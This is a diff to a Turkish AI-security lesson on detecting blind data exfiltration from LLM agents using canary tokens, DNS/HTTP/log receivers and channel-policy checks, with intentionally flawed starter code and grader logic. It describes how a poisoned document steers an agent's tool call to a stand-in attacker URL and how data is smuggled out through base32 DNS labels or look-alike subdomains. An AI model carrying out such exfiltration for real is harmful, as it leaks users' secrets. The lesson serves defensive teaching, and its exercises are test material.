@@ -5,10 +5,26 @@ summary: Yanıt dönmese bile DNS, HTTP ve araç yan etkilerindeki canary kanıt
 timeout: 45
 ---
 
-::: anlat Yanıtın olmaması veri çıkışının olmadığını göstermez
+::: anlat Gerçek biçimi bil, sentetik temsili ayırt et: Yanıtın olmaması veri çıkışının olmadığını göstermez
+
+| Gerçek araç/model ne gösterir | Bu ders ne kullanır | Ne söyleyemez? |
+|---|---|---|
+| Kör exfiltration testlerinde saldırganın kontrolündeki bir alıcı (Burp Collaborator, interactsh ya da kendi DNS/HTTP sunucusu) dinlenir. Model veya araç cevap görmese bile alıcıya gelen DNS sorgusu ya da HTTP isteği veri çıkışının kanıtıdır. | Görev 1–3: `veri/kanal_olaylari.json`, `veri/alici_olaylari.json` ve `veri/regresyon_kayitlari.json` içindeki **sentetik** olay ve vaka kayıtları. Son adım: deneyin kendi açtığı üç yerel alıcıyla çalışır: cevapsız HTTP POST, gerçek DNS paketi alan bir UDP soketi ve bir JSONL araç kaydı. Kurulu yerel Ollama modelinin araç önerileri senin kapından geçer. | Dış ağa, gerçek DNS çözücüsüne ya da `.test` adlarına istek gitmez. Üç model kolu, modelin genel exfiltration davranışını göstermez. Canary yalnız düz ve base32 biçimlerde aranır; başka kodlamalarla yapılan sızıntı ölçülmez. |
+
+> [!NOT]
+> Görev 1–3 sentetik veriyle çalışır. Bu görevlerde ağ, soket ya da model kullanılmaz. Son adımdaki **Gerçek deney** görevi yalnız deneyin kendi açtığı yerel HTTP/UDP alıcılarını ve kurulu yerel Ollama modelini kullanır. Dış ağa veri gitmez, yeni araç indirilmez, mitmproxy çalıştırılmaz. `veri/` dosyaları her çalıştırmada çalışma klasörüne yeniden kopyalanır; kopyada yaptığın değişiklik bir sonraki çalıştırmada sıfırlanır, **kalıcılık yoktur**. Son adımın düzenlenebilir kanal dosyası ise ayrıca kalıcı tutulur. Kontrol bu dosyalardan ayrı, gizli verilerle sınar.
+
 Bir HTTP aracı yanıt gövdesi döndürmeyebilir veya model yalnız “işlem tamamlanamadı” mesajı görebilir. Buna rağmen giden istek, DNS sorgusu veya başka bir aracın logu saldırganın kontrolündeki sentetik uç noktada gözlenebilir. Buna kör exfiltration denir: kanıt modelin doğrudan yanıtında değil, kanalın yan etkisindedir.
 
-Bu ders gerçek veri sızdırmaz. Bütün hedefler `.test` fixture adları, bütün olaylar bellek içi kayıtlardır; mitmproxy, DNS, socket ve ağ kullanılmaz. Canary, gerçek hassas veri yerine konulan benzersiz işaretçidir. Kanal kararı, olay kanıtı ve politika regresyonu ayrı ölçülür.
+Bu ders gerçek veri sızdırmaz. Bütün hedefler `.test` adlarıdır. Görev 1–3'te olaylar bellek içi kayıtlardır; son adımda yalnız deneyin kendi yerel alıcıları kullanılır. Canary, gerçek hassas veri yerine konulan benzersiz bir işaretçidir. Kanal kararı, olay kanıtı ve politika regresyonu ayrı ölçülür.
+
+**LLM ajanında kör sızdırma nasıl olur?** Bir ajanın "web sayfası getir", "log yaz", "bir adres çözümle" gibi araçları varsa, zehirli bir belge modeli şöyle bir çağrıya yönlendirebilir: `http://toplayici.saldirgan.test/?d=<gizli>`. İstek cevapsız kalabilir ya da araç hata döndürebilir. Model kullanıcıya "işlem tamamlanamadı" der ve kimse bir şey fark etmez. Oysa veri, isteğin URL'si ya da bir DNS adının etiketi olarak saldırganın alıcısına ulaşmıştır. Yalnız modelin yanıtına bakan bir güvenlik testi bu olayı "başarısız saldırı" diye kaydeder.
+
+**Saldırgan bakışı:**
+
+- **DNS:** Saldırgan, veriyi DNS etiketlerine böler (`parca1.parca2.c2.saldirgan.test`). Birçok ağda HTTP çıkışı kapalıdır ama DNS çözümü açıktır. DNS etiketleri büyük/küçük harf ayırmadığı için veriyi base32 gibi tek kipli bir alfabeyle kodlar. `veri/alici_olaylari.json` içindeki `e-01` olayında canary küçük harfle yazılmıştır ve düz substring araması onu **kaçırır**.
+- **Benzer alan adı:** Saldırgan, izinli bir alan adıyla başlayan bir alt alan adı kullanır: `log.sirket.test.saldirgan.test`.
+- **İzinli kanalı kötüye kullanmak:** İzinli bir log aracına canary yazdırır ve log sonradan dışarı aktarılır.
 :::
 
 ::: tahmin Boş yanıt kanıtı siler mi?
@@ -43,9 +59,35 @@ Karar sırası:
 
 Bu işlev olay üretmez ve ağ açmaz; yalnız aday kararını döndürür.
 
+Görünür veri: `veri/kanal_olaylari.json`. İlk iki olay ve log olayı izinlidir. `dns` olayı `kanal-izinsiz`, iki saldırgan hedefi ise `hedef-izinsiz` almalıdır. Dört bozuk olay reddedilmelidir.
+
 ```starter
+from ai_saldiri_veri import json_yukle
+
 def kanal_karari(olay, politika):
-    return {}
+    # KUSURLU BAŞLANGIÇ KODU: hedefi kanonikleştirmiyor (büyük harfli izinli hedef reddedilir), hedefi önekle karşılaştırıyor (log.sirket.test.saldirgan.test geçer) ve olay biçimini doğrulamıyor!
+    hedef = olay["hedef"]
+    if olay["kanal"] not in politika["kanallar"]:
+        return {"izinli": False, "neden": "kanal-izinsiz", "hedef": hedef}
+    if not any(hedef.startswith(h) for h in politika["hedefler"]):
+        return {"izinli": False, "neden": "hedef-izinsiz", "hedef": hedef}
+    return {"izinli": True, "neden": "izinli", "hedef": hedef}
+
+veri = json_yukle("veri/kanal_olaylari.json")
+for o in veri["olaylar"] + veri["bozuk_olaylar"]:
+    try:
+        k = kanal_karari(o, veri["politika"])
+        print(o["kanal"], o["hedef"], "→", k["neden"])
+    except ValueError as hata:
+        print(o["kanal"], o["hedef"], "→ RED:", hata)
+```
+
+```setup
+import sys
+from pathlib import Path
+sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
+from ai_saldiri_veri import hazirla
+hazirla("ai-saldiri-23")
 ```
 
 ```test
@@ -144,6 +186,13 @@ Olayı ve politikayı ayrı doğrula. Kanalı önce, normalize hedefi sonra kar�
 Kör kanal analizi için her olayın kimliği, kanalı, hedefi, taşıdığı fixture verisi ve doğrudan yanıt durumu tutulur. `yanit=None` doğrudan cevap yok demektir; boş string ise boş bir cevap alınmıştır ve `None` ile aynı değildir. Canary içeren olay, yanıttan bağımsız olarak kanıt listesine girer.
 
 Kanal sayıları gözlem yüzeyini, canary izleri veri çıkışını, yanıtsız kanıt listesi ise kör çalışan vakaları gösterir. Bu rapor gerçek gizli veri çıkarmak yerine ölçülebilir sentetik kanıt üretir.
+
+**Sık tuzaklar:**
+
+- **`None` ile `""` karışıklığı:** `yanit=""` cevap geldiği ama boş olduğu anlamına gelir. `yanit=None` ise hiç cevap gelmediği anlamına gelir. İkisini aynı saymak, kör kanıt listesini bozar (`e-03`).
+- **Yanıta göre kanıt aramak:** Yanıtı olmayan olayı rapordan atmak, kör exfiltration'ın tam olarak saklandığı yeri siler.
+- **Hedefi önekle denetlemek:** `startswith("log.sirket.test")` kontrolü, `log.sirket.test.saldirgan.test` hedefine de izin verir. Hedef kanonikleştirildikten sonra **tam eşitlikle** karşılaştırılır.
+- **Kararı olaydan sonra vermek:** Kanal kararı gönderimden **önce** çalışmalıdır. Olaydan sonra yapılan kontrol yalnız raporlar, engellemez.
 :::
 
 ::: gorev 2 · Yanıtsız olaylardaki canary kanıtını say
@@ -159,9 +208,38 @@ Dönüş:
 
 `canary_izleri`, verisinde canary substring'i bulunan bütün olayları içerir. `yanitsiz_kanit` bunların yalnız `yanit is None` olanlarını içerir. Listeler alfabetik kimlik sıralıdır. Boş olay listesinde sayımlar sıfır, listeler boştur. Girdi sırası sonucu değiştirmemeli ve olaylar değiştirilmemelidir.
 
+Görünür veri: `veri/alici_olaylari.json`. Doğru raporda canary izleri `e-02`, `e-03` ve `e-05`'tir; yanıtsız kanıt yalnız `e-02` olur. `e-01` (küçük harf) iz sayılmaz.
+
 ```starter
+from ai_saldiri_veri import json_yukle
+
 def kor_kanit_raporu(olaylar, canary):
-    return {}
+    # KUSURLU BAŞLANGIÇ KODU: boş yanıtı ("") yanıtsız sayıyor, yalnız yanıtsız olaylarda canary arıyor ve olay biçimini doğrulamıyor!
+    sayim = {"dns": 0, "http": 0, "arac": 0}
+    izler, yanitsiz = [], []
+    for o in olaylar:
+        sayim[o["kanal"]] = sayim.get(o["kanal"], 0) + 1
+        if not o["yanit"] and canary in o["veri"]:
+            izler.append(o["id"])
+            yanitsiz.append(o["id"])
+    return {"olay": len(olaylar), "kanal_sayilari": sayim, "canary_izleri": sorted(izler), "yanitsiz_kanit": sorted(yanitsiz)}
+
+veri = json_yukle("veri/alici_olaylari.json")
+print(kor_kanit_raporu(veri["olaylar"], veri["canary"]))
+for o in veri["bozuk_olaylar"]:
+    try:
+        kor_kanit_raporu([o], veri["canary"])
+        print(o["id"], "KABUL edildi (yanlış)")
+    except ValueError as hata:
+        print(o["id"], "reddedildi:", hata)
+```
+
+```setup
+import sys
+from pathlib import Path
+sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
+from ai_saldiri_veri import hazirla
+hazirla("ai-saldiri-23")
 ```
 
 ```test
@@ -284,9 +362,44 @@ Dönüş:
 
 Listeler alfabetik sıralıdır; bir vaka birden fazla sorun listesine girebilir. Boş girdi için boş rapor dön. Girdi sırası sonucu etkilememeli ve kayıtlar değişmemelidir.
 
+Görünür veri: `veri/regresyon_kayitlari.json`. Beklenen sınıflar README tablosundadır. `v-mesru-kor` hem `yanitsiz_kanit` hem `temiz` listesinde yer alır; iki tutarsız kayıt reddedilmelidir.
+
 ```starter
+from ai_saldiri_veri import json_yukle
+
 def kor_politika_regresyonu(kayitlar):
-    return {}
+    # KUSURLU BAŞLANGIÇ KODU: sızıntıyı yanıta bakarak tanımlıyor (yanıtsız sızıntıyı kaçırır), yanıtsız kanıtı yalnız izinsiz vakalarda arıyor ve tutarsız kaydı reddetmiyor!
+    rapor = {"vaka": len(kayitlar), "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}
+    for v in sorted(kayitlar, key=lambda x: x["vaka_id"]):
+        if not v["izinli"] and v["olay_oldu"]:
+            rapor["politika_bypassi"].append(v["vaka_id"])
+            if v["canary_goruldu"] and v["yanit_alindi"]:
+                rapor["sessiz_sizinti"].append(v["vaka_id"])
+            if v["canary_goruldu"] and not v["yanit_alindi"]:
+                rapor["yanitsiz_kanit"].append(v["vaka_id"])
+        if v["izinli"] and not v["olay_oldu"]:
+            rapor["beklenen_olay_yok"].append(v["vaka_id"])
+        if v["olay_oldu"] == v["izinli"]:
+            rapor["temiz"].append(v["vaka_id"])
+    return rapor
+
+veri = json_yukle("veri/regresyon_kayitlari.json")
+for k, v in kor_politika_regresyonu(veri["kayitlar"]).items():
+    print(k, v)
+for b in veri["bozuk_kayitlar"]:
+    try:
+        kor_politika_regresyonu([b])
+        print(b["vaka_id"], "KABUL edildi (yanlış)")
+    except ValueError as hata:
+        print(b["vaka_id"], "reddedildi:", hata)
+```
+
+```setup
+import sys
+from pathlib import Path
+sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
+from ai_saldiri_veri import hazirla
+hazirla("ai-saldiri-23")
 ```
 
 ```test
@@ -385,7 +498,7 @@ Ham sentetik örnek aynı Pafta sunucusunda `/data/ai-saldiri-23-kanallar.txt` a
 
 Bu görev üç gerçek yerel alıcı kullanır. HTTP POST alıcısı veriyi gerçekten kaydedip HTTPcevabı vermeden bağlantıyı kapatır. UDPalıcıya gerçek DNS A/INsorgu paketi gönderilir, canary base32etiketlerden çözülüp kaydedilir; DNScevabı gönderilmez. Araç kanalı gerçek yerel JSONL kaydıdır. **DNSpaketi yalnız deneyin kendi UDPloopback alıcısına gider; dışDNSresolver/.testhedefe ağ sorgusu yapılmaz.** Hedef isimleri yerel olay etiketidir.
 
-Öğrencinin kanal/hedef kararı gönderimden önce çalışır. Altı doğrudan sentetik kontrol her kanalda meşru gönderim ve hedef reddini gerçek alıcıda sınar. Yedinci kontrollü kapı-atlama, yanıtsız canaryölçümünün gerçek olayı yakaladığını gösterir; model saldırıbaşarısı diye sayılmaz. Üç native model kolu temiz/korumalı/kapısız önerileri karşılaştırır; modelin uyması şart değildir. Gerçek alıcı dosyasındaki olaylar, paketin/gövdenin hashleri, yanıt yokluğu ve politika bypass raporu ayrı kaydedilir. Yalnız kendi HTTP/UDP alıcıları kapanır.
+Kanıtı okurken önce alıcı dosyasına (`alici_olaylari`) bak. HTTP alıcısı isteği kaydeder ve cevap vermeden bağlantıyı kapatır; istemci tarafında bu bir hata gibi görünür. UDP alıcısı gerçek bir DNS A/IN paketi alır. Paketteki etiketlerden base32 ile kodlanmış canary'yi çözer ve hiçbir DNS cevabı göndermez. Böylece "yanıt yok ama veri ulaştı" durumu üç kanalda da gerçekten oluşur. Öğrencinin kanal/hedef kararı gönderimden önce çalışır. Altı doğrudan sentetik kontrol her kanalda meşru gönderim ve hedef reddini gerçek alıcıda sınar. Yedinci kontrollü kapı-atlama, yanıtsız canaryölçümünün gerçek olayı yakaladığını gösterir; model saldırıbaşarısı diye sayılmaz. Üç native model kolu temiz/korumalı/kapısız önerileri karşılaştırır; modelin uyması şart değildir. Gerçek alıcı dosyasındaki olaylar, paketin/gövdenin hashleri, yanıt yokluğu ve politika bypass raporu ayrı kaydedilir. Yalnız kendi HTTP/UDP alıcıları kapanır.
 :::
 
 ::: gorev Gerçek deney · Yanıtsız alıcıdaki canaryyi ölç ve yetkisiz kanalı durdur
@@ -400,11 +513,17 @@ timeout: 300
 ```starter
 import ai_lab
 
-def kanal_karari(olay,politika):return {}
+def kanal_karari(olay, politika):
+    # KUSURLU BAŞLANGIÇ KODU: yalnız kanala bakıyor, hedefi hiç denetlemiyor; izinli kanaldan saldırgan hedefe gönderim gerçek alıcıya ulaşır!
+    hedef = olay["hedef"].lower().rstrip(".")
+    izinli = olay["kanal"] in politika["kanallar"]
+    return {"izinli": izinli, "neden": "izinli" if izinli else "kanal-izinsiz", "hedef": hedef}
 
-def kor_kanit_raporu(olaylar,canary):return {}
+def kor_kanit_raporu(olaylar, canary):
+    return {"olay": len(olaylar), "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}
 
-def kor_politika_regresyonu(kayitlar):return {}
+def kor_politika_regresyonu(kayitlar):
+    return {"vaka": len(kayitlar), "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}
 
 if ai_lab.CALISTIR:
     from sandbox import ai_gercek_ai_saldiri_23 as deney
@@ -562,7 +681,14 @@ for ad, mutant in [("sessiz sızıntıyı gizleyen", m_sessiz), ("izinli yanıts
 from sandbox import ai_gercek_ai_saldiri_23 as deney
 import tempfile
 from pathlib import Path
-if not ok(not ai_lab.kod_denetimi(src,('karar_ref','kanit_ref','regresyon_ref')), 'laboratuvar/gerçek ölçüm yamalanmamalı'):stop()
+import ast
+_yasak=('karar_ref','kanit_ref','regresyon_ref','kanit_yaz')
+_sorun=list(ai_lab.kod_denetimi(src,_yasak))
+for _n in ast.walk(ast.parse(src)):
+    if isinstance(_n,ast.ImportFrom) and any(a.name in _yasak or a.name=='*' for a in _n.names):_sorun.append('referans importu yasak')
+    if isinstance(_n,(ast.Import,ast.ImportFrom)) and any(x and x.split('.')[0] in ('inspect','importlib','runpy') for x in [a.name for a in _n.names]+([_n.module] if isinstance(_n,ast.ImportFrom) else [])):_sorun.append('kaynak okuma/dinamik import yasak')
+    if isinstance(_n,ast.Name) and _n.id in ('exec','eval','compile','__builtins__'):_sorun.append('dinamik kod çalıştırma yasak: '+_n.id)
+if not ok(not _sorun, 'laboratuvar/gerçek ölçüm yamalanmamalı, referans kullanılmamalı: '+'; '.join(sorted(set(_sorun)))):stop()
 with tempfile.TemporaryDirectory(prefix='pafta_blind23_') as tmp:
     p=Path(tmp)/'kanal.json';p.write_text(deney.ORNEK.read_text(encoding='utf-8'),encoding='utf-8')
     r=deney.deney(kanal_karari,kor_kanit_raporu,kor_politika_regresyonu,p,Path(tmp)/'deney')
